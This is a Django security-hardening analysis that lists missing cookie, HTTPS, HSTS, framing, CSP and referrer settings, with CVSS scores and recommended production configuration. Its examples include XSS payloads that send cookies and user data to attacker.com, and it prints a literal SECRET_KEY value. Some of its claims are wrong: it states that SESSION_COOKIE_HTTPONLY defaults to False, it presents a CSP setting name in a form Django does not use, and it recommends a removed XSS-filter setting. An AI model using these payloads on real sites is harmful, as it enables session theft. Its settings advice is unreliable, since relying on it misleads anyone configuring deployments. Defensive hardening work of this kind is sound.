# Django Security Configuration Hardening Analysis

## Executive Summary

Fresh Django projects often retain development-friendly defaults that expose critical security risks in production. This analysis identifies security misconfiguration vulnerabilities and provides hardening guidance for deployment-critical settings.

---

## Current Security Posture Assessment

### Current Configuration

**Positive (Already Implemented):**

- ✅ `SECRET_KEY` loaded from environment variable (not hardcoded)
- ✅ `DEBUG` defaults to False (safe default)
- ✅ CSRF middleware enabled
- ✅ Security middleware enabled
- ✅ Password validators configured
- ✅ Short password reset timeout (1 hour)

**Critical Issues (Need Hardening):**

- ❌ `ALLOWED_HOSTS` restrictive but needs environment flexibility
- ❌ Missing `SESSION_COOKIE_SECURE` (sessions vulnerable to MITM if HTTP)
- ❌ Missing `SESSION_COOKIE_HTTPONLY` (sessions accessible to JavaScript/XSS)
- ❌ No HTTPS enforcement (`SECURE_SSL_REDIRECT` not set)
- ❌ No HSTS headers (allows downgrade to HTTP)
- ❌ Missing security headers (CSP, X-Frame-Options, etc.)
- ❌ Database uses SQLite (only for development)
- ❌ `EMAIL_BACKEND` set to console (only for development)
- ❌ No explicitcookie security settings for CSRF
- ❌ Missing referrer policy configuration

---

## Vulnerability Analysis

### 1. Session Hijacking via Unencrypted Transport

**Vulnerability:** Missing `SESSION_COOKIE_SECURE`

```python
# INSECURE (CURRENT)
# If HTTPS is used but SESSION_COOKIE_SECURE not set,
# cookie can be accessed over HTTP too via downgrade attack

SESSION_COOKIE_SECURE = False  # Default - sends cookie over HTTP
```

**Risk:**

- Attacker intercepts session cookie over unencrypted HTTP
- Attacker uses cookie to impersonate user
- Complete account takeover
- Session tokens accessible to network attacks

**CVSS:** 8.1 (High) - Network, Low Privilege, Changed Scope

---

### 2. Session Compromise via JavaScript Access

**Vulnerability:** Missing `SESSION_COOKIE_HTTPONLY`

```python
# INSECURE (CURRENT)
# JavaScript can access session cookie
SESSION_COOKIE_HTTPONLY = False  # Default - accessible to JS

# Attack: <img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">
# Result: Session cookie sent to attacker via XSS
```

**Risk:**

- XSS attacks can steal session cookies
- Malicious JavaScript accesses `document.cookie`
- Account takeover via XSS + cookie theft
- CSRF tokens also at risk

**CVSS:** 7.1 (High) - Network, Low Privilege, Unchanged Scope

---

### 3. HTTPS Downgrade Attacks

**Vulnerability:** Missing `SECURE_SSL_REDIRECT` and HSTS headers

```
Attacker performs MITM attack:
1. User visits: https://example.com/auth/login/
2. Attacker intercepts and downgrades to: http://example.com/auth/login/
3. User enters credentials over plaintext HTTP
4. Credentials captured by attacker
5. Complete account compromise

Root Cause: No SECURE_SSL_REDIRECT (doesn't enforce HTTPS)
Root Cause: No HSTS (allows MITM downgrade even once visited)
```

**Risk:**

- Credential capture in transit
- Session hijacking easier
- Man-in-the-middle attacks
- Regulatory breach (GDPR, HIPAA, PCI-DSS)

**CVSS:** 7.4 (High) - Network, No Privilege, Changed Scope

---

### 4. Click-jacking / Frame Injection

**Vulnerability:** Missing/misconfigured `X_FRAME_OPTIONS`

```html
<!-- Attacker's malicious page -->
<iframe src="https://example.com/auth/dashboard/" style="opacity:0;"></iframe>
<button onclick="click_the_hidden_button()">Click me to win!</button>

<!-- User clicks, unknowingly clicks button in hidden frame -->
<!-- If X-Frame-Options not set, frame loads and action performs -->
```

**Risk:**

- Attacker tricks user into performing unwanted actions
- Can change passwords, transfer funds, modify settings
- User doesn't realize what happened

**CVSS:** 5.4 (Medium) - Network, Low Privilege, Unchanged Scope

---

### 5. Missing Content Security Policy

**Vulnerability:** No CSP headers configured

```javascript
// Without CSP, any inline script executes:
<script>
  // Attacker's malicious code executes here
  fetch('https://attacker.com/steal?data=' + userData);
</script>

// With CSP, inline scripts blocked by default
// Only whitelisted sources allowed
```

**Risk:**

- XSS attacks execute with full privileges
- Malware injection easier
- Data theft via malicious scripts
- No defense against script injection

---

### 6. Secret Key Management Risk

**Vulnerability:** SECRET_KEY exposed in .env file

```python
# Current: .env file checked into version control (maybe)
DJANGO_SECRET_KEY= django-insecure-fvzfugp#lbzbt(05y4w%@a$(7_5%)fa68+@itxqkiuhna8@a4=

# Risk:
# - If .env leaked, SECRET_KEY compromised
# - Session tokens can be forged
# - Password reset tokens can be forged
# - All signed data invalid
```

**Best Practice:**

- .env file should NOT be in git (add to .gitignore)
- Use separate SECRET_KEY for each environment
- Rotate SECRET_KEY if compromised
- Use secure key storage (AWS Secrets Manager, HashiCorp Vault, etc.)

---

### 7. Insecure Cookie Settings for CSRF

**Vulnerability:** Missing `CSRF_COOKIE_SECURE` and `CSRF_COOKIE_HTTPONLY`

```python
# INSECURE (CURRENT)
# CSRF token sent over HTTP and accessible to JavaScript

# Risk:
# - CSRF token stolen via XSS
# - CSRF token intercepted via MITM
# - CSRF protections bypassed
```

---

### 8. Referrer Information Leakage

**Vulnerability:** No `SECURE_REFERRER_POLICY`

```
User clicks link from secure page to third-party site:
https://example.com/private-data → https://external-site.com

Third-party site receives:
Referer: https://example.com/private-data

Risk:
- Private URLs leaked to external sites
- User behavior tracking
- Information disclosure
```

---

## Deployment Security Configuration

### Production vs Development Environments

| Setting                     | Development | Production        |
| --------------------------- | ----------- | ----------------- |
| `DEBUG`                     | True        | False ❌ CRITICAL |
| `ALLOWED_HOSTS`             | localhost   | Domain names      |
| `SESSION_COOKIE_SECURE`     | False       | True              |
| `SESSION_COOKIE_HTTPONLY`   | False       | True              |
| `CSRF_COOKIE_SECURE`        | False       | True              |
| `CSRF_COOKIE_HTTPONLY`      | False       | True              |
| `SECURE_SSL_REDIRECT`       | False       | True              |
| `SECURE_HSTS_SECONDS`       | 0           | 31536000          |
| `SECURE_BROWSER_XSS_FILTER` | False       | True              |
| `X_FRAME_OPTIONS`           | Unset       | DENY              |
| `DATABASE`                  | SQLite      | PostgreSQL        |
| `EMAIL_BACKEND`             | Console     | SMTP              |

---

## Hardening Strategy

### Environment-Based Configuration

```python
# Recommended approach:
ENVIRONMENT = os.environ.get('ENVIRONMENT', 'development')
IS_PRODUCTION = ENVIRONMENT == 'production'
IS_DEVELOPMENT = ENVIRONMENT == 'development'

# Then conditionally apply settings:
if IS_PRODUCTION:
    DEBUG = False
    SESSION_COOKIE_SECURE = True
    SECURE_SSL_REDIRECT = True
    # ... etc
else:  # Development
    DEBUG = True
    SESSION_COOKIE_SECURE = False
    # ... development-friendly settings
```

### Critical Settings for Production

**1. Secrets Management**

- SECRET_KEY: 50+ character random string, unique per environment
- Store in: AWS Secrets Manager, HashiCorp Vault, environment variables
- Never commit to version control
- Rotate regularly

**2. Transport Security**

```python
SESSION_COOKIE_SECURE = True          # HTTPS only
CSRF_COOKIE_SECURE = True              # HTTPS only
SECURE_SSL_REDIRECT = True             # Redirect HTTP → HTTPS
```

**3. Cookie Protection**

```python
SESSION_COOKIE_HTTPONLY = True         # Not accessible to JS
CSRF_COOKIE_HTTPONLY = True            # Not accessible to JS
SESSION_COOKIE_SAMESITE = 'Strict'     # CSRF protection
CSRF_COOKIE_SAMESITE = 'Strict'        # CSRF protection
```

**4. HSTS (Force HTTPS)**

```python
SECURE_HSTS_SECONDS = 31536000         # 1 year
SECURE_HSTS_INCLUDE_SUBDOMAINS = True  # All subdomains
SECURE_HSTS_PRELOAD = True             # Add to HSTS preload list
```

**5. Frame Security**

```python
X_FRAME_OPTIONS = 'DENY'               # Prevent framing/click-jacking
```

**6. Content Security Policy**

```python
SECURE_CONTENT_SECURITY_POLICY = {
    'default-src': ("'self'",),
    'script-src': ("'self'", 'cdn.example.com'),
    'style-src': ("'self'", "'unsafe-inline'"),
    'img-src': ("'self'", 'data:', 'https:'),
    'font-src': ("'self'",),
    'connect-src': ("'self'",),
    'frame-ancestors': ("'none'",),
}
```

**7. Other Security Headers**

```python
SECURE_BROWSER_XSS_FILTER = True
SECURE_REFERRER_POLICY = 'strict-origin-when-cross-origin'
PERMISSIONS_POLICY = {...}
```

---

## CVSS Risk Summary

| Vulnerability                   | CVSS | Risk                                |
| ------------------------------- | ---- | ----------------------------------- |
| Missing SESSION_COOKIE_SECURE   | 8.1  | Session hijacking via MITM          |
| Missing SESSION_COOKIE_HTTPONLY | 7.1  | Cookie theft via XSS                |
| Missing SECURE_SSL_REDIRECT     | 7.4  | HTTPS downgrade, credential capture |
| Missing X_FRAME_OPTIONS         | 5.4  | Click-jacking attacks               |
| No CSP                          | 6.5  | XSS execution without mitigation    |
| Exposed SECRET_KEY              | 9.8  | Forged tokens, complete compromise  |
| Missing HSTS                    | 6.8  | MITM downgrade attacks              |
| No Referrer Policy              | 5.3  | Information disclosure              |

---

## Compliance Requirements

This hardening addresses:

- **PCI-DSS 6.5.10** - Unvalidated redirects and forwards
- **PCI-DSS 6.2.4** - Security configuration standards
- **NIST SP 800-52 Rev. 2** - HTTPS and TLS requirements
- **OWASP Top 10 2021 - A05:2021** - Security misconfiguration
- **GDPR Article 32** - Appropriate technical security measures
- **HIPAA Security Rule** - Configuration management

---

## Environment Variable Checklist

### Required for Production

```bash
# Secret Management
ENVIRONMENT=production                          # Set environment
DJANGO_SECRET_KEY=<50+ char random string>      # Per-environment unique

# HTTPS/Security
ALLOWED_HOSTS=example.com,www.example.com       # Comma-separated
SECURE_SSL_REDIRECT=True                        # Force HTTPS
SECURE_HSTS_SECONDS=31536000                    # 1 year

# Database
DATABASE_ENGINE=django.db.backends.postgresql   # Not SQLite
DATABASE_NAME=devsec_prod                       # Production DB
DATABASE_USER=<db-user>
DATABASE_PASSWORD=<db-password>
DATABASE_HOST=<db-host>

# Email (for real SMTP)
EMAIL_BACKEND=django.core.mail.backends.smtp.EmailBackend
EMAIL_HOST=smtp.example.com
EMAIL_PORT=587
EMAIL_HOST_USER=<email-user>
EMAIL_HOST_PASSWORD=<email-password>
```

---

## Testing the Configuration

### Security Headers Check

```bash
curl -I https://example.com/auth/login/

# Expected headers:
# Strict-Transport-Security: max-age=31536000
# X-Frame-Options: DENY
# X-Content-Type-Options: nosniff
# Content-Security-Policy: ...
# Referrer-Policy: strict-origin-when-cross-origin
```

### Django Check Command

```bash
python manage.py check --deploy

# Should report no errors in production settings
```

### HTTPS/TLS Validation

```bash
# Test SSL/TLS configuration
openssl s_client -connect example.com:443

# Should support TLS 1.2+ only
# Should have valid certificate
```

---

## Next Steps

1. Review [DJANGO_SECURITY_HARDENING_FIX_GUIDE.md](DJANGO_SECURITY_HARDENING_FIX_GUIDE.md) for implementation
2. Study [DJANGO_SECURITY_HARDENING_POC.md](DJANGO_SECURITY_HARDENING_POC.md) for attack demonstrations
3. Follow [DJANGO_SECURITY_HARDENING_QUICK_REFERENCE.md](DJANGO_SECURITY_HARDENING_QUICK_REFERENCE.md) for quick fixes
4. Use [PULL_REQUEST_TEMPLATE_DJANGO_HARDENING.md](PULL_REQUEST_TEMPLATE_DJANGO_HARDENING.md) for PR submission

---

## References

- [Django Deployment Checklist](https://docs.djangoproject.com/en/stable/howto/deployment/checklist/)
- [Django Security Middleware](https://docs.djangoproject.com/en/stable/topics/security/)
- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [PCI-DSS Requirements](https://www.pcisecuritystandards.org/)
- [NIST SP 800-52 Rev. 2](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-52r2.pdf)
